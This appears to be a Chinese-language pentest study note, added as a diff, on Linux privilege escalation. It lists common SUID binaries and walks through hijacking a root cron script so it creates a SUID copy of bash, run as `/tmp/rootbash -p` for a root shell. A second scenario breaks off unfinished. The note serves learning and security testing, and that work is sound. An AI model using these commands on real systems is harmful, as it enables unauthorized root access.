@@ -1,0 +1,67 @@
+Linux 本地信息收集与提权思路2
+
+
+/usr/bin/chfn：用于更改用户的指纹信息（联系信息）命令。
+
+/usr/bin/chsh：用于更改用户登录 shell 的命令。
+
+/usr/bin/chage：用于更改用户密码过期信息的命令。
+
+/usr/bin/gpasswd：用于管理 /etc/group 文件的命令。
+
+/usr/bin/newgrp：用于更改当前用户组 ID 的命令。
+
+/usr/bin/mount：用于挂载文件系统的命令。
+
+/usr/bin/su：用于切换用户，通常用于成为 root 用户。
+
+/usr/bin/umount：用于卸载文件系统的命令。
+
+/usr/bin/sudo：用于以管理员（root）权限执行命令的命令。
+
+/usr/bin/pkexec：由 PolicyKit 使用的命令，允许以 root 权限执行命令。
+
+/usr/bin/crontab：用于编辑用户的定时任务（cron 作业）命令。
+
+/usr/bin/passwd：用于更改用户密码的命令。
+
+/usr/sbin/pam_timestamp_check：与 PAM（可插拔认证模块）系统相关的命令，用于检查认证时间戳。
+
+/usr/sbin/unix_chkpwd：由 PAM 用于检查密码有效性的命令。
+
+/usr/sbin/usernetctl：与用户网络配置相关的命令。
+
+/usr/sbin/userhelper：用于管理用户帐户的命令。
+
+/usr/lib/polkit-1/polkit-agent-helper-1：PolicyKit 授权框架的辅助程序。
+
+/usr/lib64/dbus-1/dbus-daemon-launch-helper：用于 DBus 的守护进程启动辅助工具。
+
+
+检查计划任务与脚本
+cat /etc/crontab
+
+*/5 * * * * root /etc/script/CleaningScript.sh >/dev/null 2>&1
+（每5分钟以root身份执行）
+ls -l /etc/script/CleaningScript.sh（查看权限）
+1.脚本本身可写
+
+echo '#!/bin/bash
+cp /bin/bash /tmp/rootbash
+chmod +s /tmp/rootbash' > /etc/script/CleaningScript.sh
+
+#!/bin/bash：表示脚本会使用 bash 执行。
+
+cp /bin/bash /tmp/rootbash：复制系统中的 bash 程序到 /tmp/rootbash，即在 /tmp 目录下创建一个新的 bash 程序。
+
+chmod +s /tmp/rootbash：给 /tmp/rootbash 程序设置 SUID 权限。SUID（Set User ID） 是一种特殊权限，当用户执行这个文件时，文件将以文件所有者的权限执行，而不是当前用户的权限。由于我们复制的是 /bin/bash，而 bash 程序的所有者是 root，所以设置 SUID 后，执行 /tmp/rootbash 将以 root 权限运行。
+
+/tmp/rootbash -p
+bash -p = 不降权模式，保持 SUID 权限，直接 root。
+2.脚本不可写，但目录可写
+ls -ld /etc/script/
+drwxr-xr-x. 2 root root 31 Apr  1  2018 /etc/script/  （不可写）
+
+
+
+
